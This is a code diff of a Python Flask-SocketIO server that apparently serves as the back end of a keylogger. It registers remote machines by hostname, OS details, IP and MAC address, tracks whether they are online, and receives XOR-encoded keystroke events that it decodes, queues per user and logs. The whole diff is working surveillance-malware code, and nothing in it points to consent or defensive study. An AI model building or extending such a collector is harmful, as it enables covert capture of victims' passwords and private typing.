@@ -1,54 +1,73 @@
-from datetime import datetime
+import logging
+from multiprocessing.queues import Queue
 
-from flask import request, session
-from flask_socketio import SocketIO, emit
+from flask import request
+from flask_socketio import SocketIO
 
-from backend.data.repository import db_manager
-from backend.data.queue_manager import event_queue
+from backend.data.database_manager import database_manager
 from shared.Encriptor import XorCharCipher
 
 cipher = XorCharCipher(77)
 
 
-def register_socket_handlers(sio: SocketIO):
+def register_socket_handlers(sio: SocketIO, event_queue: Queue):
     @sio.on('connect')
-    def handle_connect():
+    def handle_connect(auth):
+
+        exists = database_manager.machine_repo.get_machine_by_username(auth)
+        if exists:
+            logging.info(f'Machine {exists["display_username"]} exist.')
+            database_manager.machine_repo.set_status(auth, True)
+            return
+
         processor = request.headers.get('Processor')
-        username = request.headers.get('Username')
+        machine_username = request.headers.get('Username')
         system = request.headers.get('System')
         node = request.headers.get('Node')
         release = request.headers.get('Release')
         version = request.headers.get('Version')
         machine = request.headers.get('Machine')
+        mac_address = request.headers.get("Mac-Address")
         ip_address = request.remote_addr
-        timestamp = int(datetime.now().timestamp())
-        connection_id = db_manager.init_connection(timestamp, username, processor, system, node, release, version, machine,
-                                                   ip_address)
+        machine_id = database_manager.machine_repo.create_machine(auth, {
+            'version': version,
+            'system': system,
+            'node': node,
+            'machine': machine,
+            'ip_address': ip_address,
+            'release': release,
+            'processor': processor,
+            'mac_address': mac_address,
+            'username': machine_username,
+        })
 
-        session['connection_id'] = connection_id
-        print("New connection:", connection_id, username, ip_address)
+        if machine_id:
+            logging.info("New connection:", machine_id, auth, ip_address)
 
     @sio.on('disconnect')
     def handle_disconnect():
-        connection_id = session.get('connection_id')
-        print("Client disconnected:", connection_id)
-        if connection_id:
-            db_manager.close_connection(connection_id)
-            print("Connection closed:", connection_id)
+        username = request.headers.get("Display-Username")
+
+        logging.info("Client disconnected:", username)
+        if username:
+            database_manager.machine_repo.set_status(username, False)
+            logging.info("Connection closed:", username)
 
     @sio.on('ev')
     def handle_event(message):
-        connection_id = int(session.get('connection_id'))
-        timestamp = int(datetime.now().timestamp())
-        key = cipher.decrypt_char(message.get('ev'))
-        print(f'Received event from {session.get("connection_id")}: {key}')
+        username = message.get("username")
+        timestamp = message.get('timestamp')
 
-        if connection_id:
-            event_queue.put(
-                type('Event', (object,), {
-                    'connection_id': connection_id,
-                    'key': key,
-                    'timestamp': timestamp
-                })()
-            )
+        try:
+            keystroke = cipher.decrypt_char(message.get('event'))
+        except TypeError:
+            return
 
+        if username:
+            event_queue.put({
+                'username': username,
+                'keystroke': keystroke,
+                'timestamp': timestamp
+            })
+
+            logging.info(f"Keystroke {keystroke} got from {username}.")
